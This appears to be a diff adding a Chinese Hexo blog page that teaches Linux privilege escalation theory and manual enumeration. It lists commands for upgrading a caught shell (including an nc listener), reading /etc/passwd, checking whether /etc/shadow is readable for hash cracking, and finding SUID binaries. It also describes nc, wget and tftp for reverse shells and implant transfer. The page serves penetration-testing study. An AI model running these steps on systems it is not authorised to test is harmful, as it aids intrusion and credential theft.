@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Linux提权精讲：原理和枚举一、提权简介提权就是提升权限，源自英语Privilege Escalation&#x2F;PrivEsca&#x2F;PE它是指在渗透测试或红队行动中获得较低权限用户之后提升至更高权限用户,直至获得ROOT权限用户的过程 我们很难直接获得系统的最高权限（root），因为应用程序通常是按需配置权限的提权方法 没有一劳永逸的解决方案， 因此我们不能依赖某种或几种方法解决所有问题。然而我们可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://lmlsama.github.io/2025/12/27/test1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Linux提权精讲：原理和枚举一、提权简介提权就是提升权限，源自英语Privilege Escalation&#x2F;PrivEsca&#x2F;PE它是指在渗透测试或红队行动中获得较低权限用户之后提升至更高权限用户,直至获得ROOT权限用户的过程 我们很难直接获得系统的最高权限（root），因为应用程序通常是按需配置权限的提权方法 没有一劳永逸的解决方案， 因此我们不能依赖某种或几种方法解决所有问题。然而我们可">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715044.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155622301.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154714603.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155629488.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155638968.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154714602.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715570.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715886.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155644434.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715950.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155703749.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155758133.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716366.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716590.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155716928.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155712971.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716794.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716867.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717057.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155803886.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717458.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155515939.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717724.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155733119.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718408.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718601.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718667.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718853.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718856.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155740272.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719277.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719615.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719770.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155746810.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227155752179.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720117.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720403.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720550.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720710.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154721011.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154721036.png">
+<meta property="og:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154808103.png">
+<meta property="article:published_time" content="2025-12-27T07:39:00.563Z">
+<meta property="article:modified_time" content="2025-12-27T08:08:29.023Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715044.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://LMLsama.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-test1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/12/27/test1/" class="article-date">
+  <time class="dt-published" datetime="2025-12-27T07:39:00.563Z" itemprop="datePublished">2025-12-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <ul>
+<li><h1 id="Linux提权精讲：原理和枚举"><a href="#Linux提权精讲：原理和枚举" class="headerlink" title="Linux提权精讲：原理和枚举"></a>Linux提权精讲：原理和枚举</h1><h2 id="一、提权简介"><a href="#一、提权简介" class="headerlink" title="一、提权简介"></a>一、提权简介</h2><p>提权就是提升权限，源自英语<code>Privilege Escalation/PrivEsca/PE</code>它是指在渗透测试或红队行动中获得较低权限用户之后提升至更高权限用户,直至获得ROOT权限用户的过程</p>
+<p>我们很难直接获得系统的最高权限（root），因为<strong>应用程序通常是按需配置权限的提权方法</strong></p>
+<p>没有一劳永逸的解决方案， 因此我们不能依赖某种或几种方法解决所有问题。然而我们可以研究常规手段和一般规律，解决大部分情况</p>
+<p>很大程度上取决于目标系统的配置，我们可以通过分析像内核版本；已安装的应用程序；支持的编程语言；其他用户的凭据等关键因素，找到获得ROOT的方法  </p>
+<p>关键元素包括：操作系统或应用程序中的错误配置漏洞，超特权用户，弱凭据…</p>
+<p>提权的重要性体现:1,重置密码；2,想绕过访问控制来提取受保护的数据；3,编辑软件配置；4,开启持久化，以便稍后可以再次访问这台计算机；5,更改现有或新建用户的用户权限；6,执行任何管理命令</p>
+<h2 id="二、权限体系（安全机制）"><a href="#二、权限体系（安全机制）" class="headerlink" title="二、权限体系（安全机制）"></a>二、权限体系（安全机制）</h2><h3 id="1-常用安全机制"><a href="#1-常用安全机制" class="headerlink" title="1. 常用安全机制"></a>1. 常用安全机制</h3><ul>
+<li><strong>UGO 体系</strong>：UGO 是 Linux 文件权限管理的基础，代表三种身份（U：文件所有者，G：文件的属组，O：其他人）和三种权限（r：读  4，w：写  2，x：执行  1）。</li>
+</ul>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715044.png" alt="img" style="zoom:67%;" />
+
+<blockquote>
+<p>chmod - change file mode bits    改变文件的权限</p>
+<p>chgrp - change group ownership    改变文件所属的组</p>
+<p>chown - change file owner and group    改变文件所有者</p>
+</blockquote>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155622301.png" alt="image-20251125140935928"></p>
+<p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9573355.html">Linux ugo 权限 - sparkdev - 博客园</a> </p>
+<ul>
+<li><strong>SUID&#x2F;SGID</strong>：SUID 让普通用户临时拥有文件属主的执行权限，SGID 让目录下新建文件的属组继承该目录的属组。</li>
+</ul>
+<p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/leehang/p/18995417">Linux 文件特殊权限位（SUID、SGID、Sticky Bit）的应用 - LeeHang - 博客园</a></p>
+<ul>
+<li><strong>Capabilities</strong>：Capabilities 机制将 root 的特权细分为多个单元，允许进程以特定的能力运行，而非给予全部 root 权限。</li>
+</ul>
+<p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/11417781.html">Linux Capabilities 简介 - sparkdev - 博客园</a></p>
+<ul>
+<li><strong>AppArmor 和 SELinux</strong>：基于强制访问控制（MAC）策略，AppArmor 使用应用程序配置文件，SELinux 基于安全策略进行访问控制。</li>
+</ul>
+<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/ytwoshuai/article/details/147517554">Linux安全模块：SELinux与AppArmor深度解析-CSDN博客</a></p>
+<ul>
+<li><p><strong>ACL（访问控制列表）</strong>：ACL 是 UGO 权限管理的补充，可针对特定用户或组设置文件或目录的访问权限。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiao_yi_xiao/article/details/117735278">Linux ACL访问控制权限完全攻略（超详细）_acl权限-CSDN博客</a></p>
+</li>
+</ul>
+<h3 id="2-不常用安全机制"><a href="#2-不常用安全机制" class="headerlink" title="2. 不常用安全机制"></a>2. 不常用安全机制</h3><p>包括 <strong>Grsecurity</strong>、<strong>Pax</strong>、<strong>ExecShield</strong>、<strong>ASLR</strong>、<strong>TOMOYO Linux</strong>、<strong>SMACK</strong>、<strong>Yama</strong>、<strong>CGroups</strong>、<strong>Linux Namespaces</strong>、<strong>StackGuard</strong>、<strong>ProPolice</strong>、<strong>seccomp</strong>、<strong>ptrace</strong>、<strong>Capsicum</strong>、<strong>Mprotect</strong>、<strong>chroot</strong> 和 <strong>firejail</strong> 等。</p>
+<h2 id="三、提权原理"><a href="#三、提权原理" class="headerlink" title="三、提权原理"></a>三、提权原理</h2><h3 id="1-基于权限体系（安全机制）的利用"><a href="#1-基于权限体系（安全机制）的利用" class="headerlink" title="1. 基于权限体系（安全机制）的利用"></a>1. 基于权限体系（安全机制）的利用</h3><ul>
+<li><strong>低权限修改可执行文件或脚本</strong>：如果低权限用户可以修改以高权限运行的可执行文件或脚本，就可以通过植入恶意代码获取高权限。UGO-RWX+S</li>
+<li><strong>利用 SUID&#x2F;SGID</strong>：查找具有 SUID&#x2F;SGID 权限的二进制文件，若存在漏洞或配置错误，可用于提权。</li>
+<li><strong>利用 Capabilities</strong>：检查进程是否具有特定的能力，如 <code>CAP_SYS_ADMIN</code>、<code>CAP_DAC_OVERRIDE</code> 等，利用这些能力进行提权。</li>
+</ul>
+<h3 id="2-基于用户行为的利用"><a href="#2-基于用户行为的利用" class="headerlink" title="2. 基于用户行为的利用"></a>2. 基于用户行为的利用</h3><ul>
+<li><strong>运维人员凭据泄露</strong>：低权限用户可能在使用高权限账户时，因备份或记录需要，将凭据保存在可访问的位置。如vim日志文件，断电之后的交换文件里面会有敏感信息</li>
+</ul>
+<h3 id="3-内存和-CPU-层面"><a href="#3-内存和-CPU-层面" class="headerlink" title="3.内存和 CPU 层面"></a>3.内存和 CPU 层面</h3><ul>
+<li><strong>内存和 CPU 层面的凭据捕捉</strong>：在权限体系的上层，攻击者可能在内存和 CPU 层面拦截，捕捉，或是修改凭据信息。如：基于内存去读取一些敏感信息来实现内核利用</li>
+</ul>
+<h2 id="四、提权枚举"><a href="#四、提权枚举" class="headerlink" title="四、提权枚举"></a>四、提权枚举</h2><p>提权枚举是提权过程中的关键步骤，不管是初始权限还是root权限    目的是收集系统和网络的信息，寻找可能的提权路径。</p>
+<p>一般，把获得初始立足点（初始shell&#x2F;权限用户）之前叫<strong>侦查</strong>&#x2F;信息收集，目的是撕口子，获得初始立足点</p>
+<p>获得初始立足点之后，为了提权，横向，渗透 打内网的信息收集叫<strong>枚举</strong>。枚举比侦察有常规方法，收集的信息内容&#x2F;使用的工具&#x2F;命令 更明确</p>
+<h3 id="1-升级命令行提示符-也叫终端升级（精）"><a href="#1-升级命令行提示符-也叫终端升级（精）" class="headerlink" title="1. 升级命令行提示符 &#x2F; 也叫终端升级（精）"></a>1. 升级命令行提示符 &#x2F; 也叫终端升级（精）</h3><p>在获得初始 Shell 后，通常需要升级到一个更完整、更稳定、交互性更强的命令行环境。 即：将我们的shell升级为完整的tty</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;	#最重要</span><br><span class="line">stty raw -echo</span><br><span class="line">export TERM=xterm-color		#TERM环境变量未设置  								#这三条命令可以提高shell交互性</span><br><span class="line"></span><br><span class="line">rlwrap nc -lvnp 443		#终端连接前加 rlwrap 这个工具可以便于上下翻找历史记录</span><br></pre></td></tr></table></figure>
+
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154714603.png" alt="image-20251213193106998" style="zoom:80%;" />
+
+<h3 id="2-手工枚举（最重要，最前）"><a href="#2-手工枚举（最重要，最前）" class="headerlink" title="2. 手工枚举（最重要，最前）"></a>2. 手工枚举（最重要，最前）</h3><h4 id="2-1-枚举用户和系统信息"><a href="#2-1-枚举用户和系统信息" class="headerlink" title="2.1 枚举用户和系统信息"></a>2.1 枚举用户和系统信息</h4><ul>
+<li><p><strong>用户信息</strong>：</p>
+<ul>
+<li><code>whoami</code>：当前用户。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155629488.png" alt="image-20251124204549218"></p>
+<ul>
+<li><code>id</code>：当前用户 UID、GID 和所属组。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155638968.png" alt="image-20251124204603416"></p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p><strong><code>lxd</code></strong>：这是<strong>最关键的组</strong>，因为 LXD 是 Linux 容器管理工具，<strong>属于 <code>lxd</code> 组的用户可以创建和管理容器</strong>，并且<strong>默认可以挂载宿主机的文件系统</strong>，从而可能实现  <strong>容器逃逸 + 权限提升</strong>。</p>
+</blockquote>
+<ul>
+<li><code>who</code>：当前登录的用户和相关信息（Linux是一个多用户系统，可以看除了当前用户还有哪些用户登陆了当前系统）可以显示登陆时间，终端类型</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154714602.png" alt="image-20251124204758722"></p>
+<ul>
+<li><code>w</code>：当前登录用户的详细信息，包括他们在做什么，及系统的负载信息；从哪个IP访问的，登陆时间，闲置时间，CPU的状态。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715570.png" alt="image-20251124205033428"></p>
+<ul>
+<li><code>last</code>：系统最近的登录记录。（有暴露内核版本）</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715886.png" alt="image-20251124205111416"></p>
+</li>
+<li><p><strong>系统和内核信息</strong>：</p>
+<ul>
+<li><code>uname -a</code>：内核版本。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155644434.png" alt="image-20251124205406761"></p>
+<ul>
+<li><code>lsb_release -a</code>（需下载）：发行版信息。<code>cat /etc/os-release</code></li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715950.png" alt="image-20251124210107540"></p>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155703749.png" alt="image-20251125144107865"></p>
+<ul>
+<li><code>cat /proc/version</code>：查看进程信息，获取内核和系统版本。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155758133.png" alt="image-20251124210214865"></p>
+<ul>
+<li><code>cat /etc/issue</code>：系统版本。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716366.png" alt="image-20251124210254448"></p>
+<ul>
+<li><p><code>hostname/hostnamectl</code>：主机名和系统信息。</p>
+<p>1.标识他，这台机器叫什么名字    2.提供这台机器在网络中的角色(SQL的服务器：可能叫:sql account&#x2F;bill&#x2F;order)</p>
+<p>便于在信息枚举&#x2F;收集过程中定位他的角色，排出数据的优先级和重要性</p>
+</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716590.png" alt="image-20251124211902915"></p>
+</li>
+<li><p><strong>网络信息</strong>：</p>
+<ul>
+<li><p><code>ip addr</code> 或 <code>ifconfig</code>：IP 地址和网卡信息。    <code>ifconfig</code>是旧版过时的命令，如果机器比较老，可能只支持这个</p>
+<blockquote>
+<p>网卡信息：拿到一个shell之后，如果有多张网卡，配合着路由信息去看，可以发现内网更多信息  <strong>IPv6</strong></p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155716928.png" alt="image-20251124210435026"></p>
+<ul>
+<li><code>ip route</code>：查看路由表信息。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155712971.png" alt="image-20251124210608534"></p>
+<ul>
+<li><code>ip neigh</code>（查看网络邻居，内网比较有价值。） 或 <code>arp -a</code>（arp缓存，内网横向渗透常见）：可以看到局域网 IP 和 MAC 地址绑定关系。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716794.png" alt="image-20251124210703713"></p>
+<blockquote>
+<p> <strong>OU 就是 MAC 地址里的“厂商身份证”，<code>00:50:56:\*</code> 一出现，说明这台机器是 VMware 虚拟化出来的。</strong></p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>192.168.168.2</code> &#x2F; <code>192.168.168.254</code></td>
+<td>邻居的 IP 地址</td>
+</tr>
+<tr>
+<td><code>dev ens33</code></td>
+<td>本机通过哪块网卡学到</td>
+</tr>
+<tr>
+<td><code>lladdr 00:50:56:...</code></td>
+<td>对方的 <strong>MAC 地址</strong></td>
+</tr>
+<tr>
+<td><code>REACHABLE</code></td>
+<td>近期验证过，<strong>可直接通信</strong></td>
+</tr>
+<tr>
+<td><code>STALE</code></td>
+<td>超过验证时间，<strong>下次发送前会先 ARP 确认</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+</li>
+</ul>
+<h4 id="2-2-枚举文件和进程"><a href="#2-2-枚举文件和进程" class="headerlink" title="2.2 枚举文件和进程"></a>2.2 枚举文件和进程</h4><ul>
+<li><p><strong>文件和目录</strong>：</p>
+<ul>
+<li><code>ls -a</code> 或 <code>ls -liah</code>：查看<strong>隐藏文件</strong>和详细信息。</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716867.png" alt="image-20251124213426391"></p>
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td>长格式（权限、硬链接数、属主、属组、大小、时间、名字）</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>显示 <strong>inode 号</strong>（文件系统里唯一标识）</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>显示 <strong>所有</strong> 文件，包括以 <code>.</code> 开头的隐藏文件</td>
+</tr>
+<tr>
+<td><code>-h</code></td>
+<td>人类可读大小（K、M、G）</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>cat /etc/passwd</code>：系统用户信息。</li>
+</ul>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717057.png" alt="image-20251124214100796" style="zoom: 33%;" />
+
+<table>
+<thead>
+<tr>
+<th>字段序号</th>
+<th>名称</th>
+<th>含义说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>用户名</td>
+<td>登录系统时使用的名称，如 <code>root</code>、<code>jack</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>密码占位符</td>
+<td>早期存加密密码，现在统一为 <code>x</code>，<strong>真实密码在 <code>/etc/shadow</code></strong></td>
+</tr>
+<tr>
+<td>3</td>
+<td>UID</td>
+<td>用户 ID，<code>0</code> 表示 root，普通用户从 <code>1000</code> 开始</td>
+</tr>
+<tr>
+<td>4</td>
+<td>GID</td>
+<td>主组 ID，对应 <code>/etc/group</code> 中的组</td>
+</tr>
+<tr>
+<td>5</td>
+<td>描述信息（GECOS）</td>
+<td>可选，通常为用户全名、联系方式等，可用 <code>chfn</code> 修改</td>
+</tr>
+<tr>
+<td>6</td>
+<td>家目录</td>
+<td>用户登录后的默认工作目录，如 <code>/home/jack</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>登录 Shell</td>
+<td>用户登录后默认启动的 shell，如 <code>/bin/bash</code>，若为 <code>/usr/sbin/nologin</code> 则无法登录</td>
+</tr>
+</tbody></table>
+<p>有<strong>家目录</strong>，很可能是活跃用户，价值↑    最后一个是否有**&#x2F;bin&#x2F;bash**，有了价值↑</p>
+<ul>
+<li><code>ls -liah /etc/shadow</code>看shadow文件是否全局可读，如果可读，可以尝试hash碰撞</li>
+</ul>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155803886.png" alt="image-20251126192544697" style="zoom: 67%;" />
+
+<ul>
+<li><code>cat /etc/crontab</code>：系统定时&#x2F;自动任务。</li>
+</ul>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717458.png" alt="image-20251124214606446" style="zoom:50%;" />
+
+<p>看自动任务的格式和权限，考虑能不能写反弹shell的提权</p>
+<ul>
+<li><code>echo $PATH</code> 和 <code>env</code>：环境变量路径的查看，看看有没有特殊的路径。做基于路径的提权利用的时候，可以追加或在前面附上想让他优先读取的路径</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155515939.png" alt="image-20251124214956647"></p>
+<ul>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：查找 SUID 文件。查看有S位的可执行文件</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>find</code></td>
+<td>查找文件</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td>从根目录开始递归搜整个文件系统</td>
+</tr>
+<tr>
+<td><code>-perm -u=s</code></td>
+<td>匹配 <strong>用户位</strong> 设置了 <strong>SUID</strong> 的文件（<code>-</code> 表示“至少”该位）</td>
+</tr>
+<tr>
+<td><code>-type f</code></td>
+<td>只列出普通文件，排除目录、链接等</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td>把“权限拒绝”等错误信息扔进黑洞，屏幕只保留结果</td>
+</tr>
+<tr>
+<td><code>perm</code></td>
+<td>就是 <strong>permission</strong> 的缩写，告诉 <code>find</code> “按权限位过滤文件”。</td>
+</tr>
+</tbody></table>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717724.png" alt="image-20251125194041330" style="zoom:50%;" />
+
+<ul>
+<li><code>history</code>：列出历史操作记录（尤其是对于密码枚举操作的命令一定要查看，很可能会提示你，比如是否有特权 ）</li>
+</ul>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155733119.png" alt="image-20251124213829673" style="zoom:67%;" />
+
+<ul>
+<li><code>which</code>：查询可执行文件，不管是系统自带还是下载的（看看机器装没装一些可能有用的程序，只显示第一次的查找结果，比如awk许多目录都有安装）</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718408.png" alt="image-20251125194304760"></p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>一句话作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>awk</strong></td>
+<td>按列&#x2F;模式切文本，<strong>“行列都能算”</strong>&#x7684;轻量数据库。</td>
+</tr>
+<tr>
+<td><strong>perl</strong></td>
+<td><strong>超级脚本胶水</strong>，正则、网络、二进制一把梭，老派黑客最爱。</td>
+</tr>
+<tr>
+<td><strong>python</strong></td>
+<td>现世代渗透第一语言，库多、跨平台、写马快。</td>
+</tr>
+<tr>
+<td><strong>ruby</strong></td>
+<td>Metasploit 母语，写 exploit 脚本短平快。</td>
+</tr>
+<tr>
+<td><strong>gcc</strong></td>
+<td>把 C&#x2F;C++ 源码变可执行文件，<strong>内核 exploit 必备</strong>。</td>
+</tr>
+<tr>
+<td><strong>vi&#x2F;vim</strong></td>
+<td>服务器必存编辑器，<strong>“没图形也能改代码”</strong>。</td>
+</tr>
+<tr>
+<td><strong>nmap</strong></td>
+<td><strong>端口扫描代名词</strong>，扫段、OS 探、NSE 脚本一条龙。</td>
+</tr>
+<tr>
+<td><strong>find</strong></td>
+<td><strong>“按名、按权、按时间”</strong>&#x6279;量找文件，提权枚举神器。</td>
+</tr>
+<tr>
+<td><strong>netcat &#x2F; nc</strong></td>
+<td><strong>“网络瑞士军刀”</strong>，正&#x2F;反向 Shell、传文件、端口监听全靠它。</td>
+</tr>
+<tr>
+<td><strong>wget</strong></td>
+<td>命令行下载器，<strong>“一句话拉马”</strong>&#x6807;配。</td>
+</tr>
+<tr>
+<td><strong>tftp</strong></td>
+<td>轻量 UDP 文件传输，<strong>内网无认证秒传马</strong>。</td>
+</tr>
+<tr>
+<td><strong>ftp</strong></td>
+<td>经典交互文件协议，<strong>旧机维持通道</strong>常用。</td>
+</tr>
+<tr>
+<td><strong>tmux &#x2F; screen</strong></td>
+<td><strong>“断网不断 Shell”</strong>&#x7684;多路复用，反弹 Shell 长驻后台。</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p><strong>awk 切，perl 胶，python 写马，gcc 编；nmap 扫，find 搜，nc 弹 Shell，wget 拉；tmux 保活，vi 改，内网再用 tftp 快。</strong></p>
+<ul>
+<li><p><strong>进程信息</strong>：</p>
+<ul>
+<li><code>ps -ef/-A</code> （e是全部 f是列表格式）或 <code>ps aux</code>：查看全部进程。（u是启动进程的用户，x是没有连接到终端的进程）</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718601.png" alt="image-20251124215039681"></p>
+<ul>
+<li><code>ps axjf</code>：进程树。（x是没有连接到终端的进程）</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718667.png" alt="image-20251124215241352"></p>
+<table>
+<thead>
+<tr>
+<th>字段名</th>
+<th>含义说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PPID</strong></td>
+<td>Parent Process ID，<strong>父进程 ID</strong></td>
+</tr>
+<tr>
+<td><strong>PID</strong></td>
+<td>Process ID，<strong>当前进程 ID</strong></td>
+</tr>
+<tr>
+<td><strong>PGID</strong></td>
+<td>Process Group ID，<strong>进程组 ID</strong>（用于信号批量发送）</td>
+</tr>
+<tr>
+<td><strong>SID</strong></td>
+<td>Session ID，<strong>会话 ID</strong>（通常等于会话首领的 PID）</td>
+</tr>
+<tr>
+<td><strong>TTY</strong></td>
+<td>控制终端，<strong>?</strong> 表示没有终端（后台进程）</td>
+</tr>
+<tr>
+<td><strong>TPGID</strong></td>
+<td>终端前台进程组 ID，<strong>-1</strong> 表示没有终端</td>
+</tr>
+<tr>
+<td><strong>STAT</strong></td>
+<td>进程状态，如 <code>S</code>（睡眠）、<code>R</code>（运行）、<code>Z</code>（僵尸）等</td>
+</tr>
+<tr>
+<td><strong>UID</strong></td>
+<td>运行该进程的用户 ID</td>
+</tr>
+<tr>
+<td><strong>TIME</strong></td>
+<td>累计占用的 CPU 时间</td>
+</tr>
+<tr>
+<td><strong>COMMAND</strong></td>
+<td>启动命令（包含参数，树形缩进显示父子关系）</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>top -n 1</code>：实时进程信息。</li>
+</ul>
+</li>
+</ul>
